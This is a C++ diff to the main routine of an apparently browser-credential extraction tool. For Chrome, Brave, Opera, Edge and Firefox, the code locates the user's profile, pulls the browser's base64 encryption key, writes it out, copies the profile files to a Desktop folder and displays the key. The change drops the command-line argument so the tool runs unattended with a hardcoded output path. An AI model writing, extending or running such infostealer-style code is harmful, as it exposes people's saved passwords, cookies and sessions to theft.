@@ -2,43 +2,36 @@
 #include "BrowserKeyExtract.h"
 #include "utility.h"
 
-#define NumberOfArgs	2
-
-int main(int argc, char* argv[])
+int main()
 {
-	if (argc != NumberOfArgs) {
-		std::cerr << "Usage: " << argv[0] << " <path/to/output/dir>\n";
-		return EXIT_FAILURE;
-	}
-	const std::string destinationPath(argv[1]);
 	const std::string username { getusername() };
 	std::vector<std::string> absolutePaths = makeAbsolutePaths(username, Browser::relativePaths);
-	std::vector<std::string> chromePaths = extractPathsForSpecificBrowser(absolutePaths, "Google");
-	std::vector<std::string> operaPaths = extractPathsForSpecificBrowser(absolutePaths, "Opera");
-	std::vector<std::string> firefoxPaths = extractPathsForSpecificBrowser(absolutePaths, "Firefox");
-	std::vector<std::string> edgePaths = extractPathsForSpecificBrowser(absolutePaths, "Edge");
-	std::vector<std::string> bravePaths = extractPathsForSpecificBrowser(absolutePaths, "Brave");
+	std::string chromePath = extractPathsForSpecificBrowser(absolutePaths, "Google");
+	std::string operaPath = extractPathsForSpecificBrowser(absolutePaths, "Opera");
+	std::string firefoxPath = extractPathsForSpecificBrowser(absolutePaths, "Firefox");
+	std::string edgePath = extractPathsForSpecificBrowser(absolutePaths, "Edge");
+	std::string bravePath = extractPathsForSpecificBrowser(absolutePaths, "Brave");
 	
 	Browser chrome, opera, edge, firefox, brave;
 
-//	const std::string destinationPath{ "C:/Users/" + username + "/Desktop/BrowserData" };
+	const std::string destinationPath{ "C:/Users/" + username + "/Desktop/BrowserData" };
 
-	chrome.ExtractKey(chromePaths, Browser::CHROME_BASE64_KEY_LENGTH);
+	chrome.ExtractKey(chromePath, Browser::CHROME_BASE64_KEY_LENGTH);
 	chrome.WriteExtractedKeyToFile(destinationPath);
-	chrome.ExtractFiles(chromePaths, destinationPath);
+	chrome.ExtractFiles(chromePath, destinationPath);
 
-	brave.ExtractKey(bravePaths, Browser::BRAVE_BASE64_KEY_LENGTH);
+	brave.ExtractKey(bravePath, Browser::BRAVE_BASE64_KEY_LENGTH);
 	brave.WriteExtractedKeyToFile(destinationPath);
-	brave.ExtractFiles(bravePaths, destinationPath);
+	brave.ExtractFiles(bravePath, destinationPath);
 
-	opera.ExtractKey(operaPaths, Browser::OPERA_BASE64_KEY_LENGTH);
-	opera.ExtractFiles(operaPaths, destinationPath);
+	opera.ExtractKey(operaPath, Browser::OPERA_BASE64_KEY_LENGTH);
+	opera.ExtractFiles(operaPath, destinationPath);
 	opera.WriteExtractedKeyToFile(destinationPath);
 
-	firefox.ExtractFiles(firefoxPaths, destinationPath);
+	firefox.ExtractFiles(firefoxPath, destinationPath);
 
-	edge.ExtractKey(edgePaths, Browser::EDGE_BASE64_KEY_LENGTH);
-	edge.ExtractFiles(edgePaths, destinationPath);
+	edge.ExtractKey(edgePath, Browser::EDGE_BASE64_KEY_LENGTH);
+	edge.ExtractFiles(edgePath, destinationPath);
 	edge.WriteExtractedKeyToFile(destinationPath);
 
 	chrome.ShowKey();
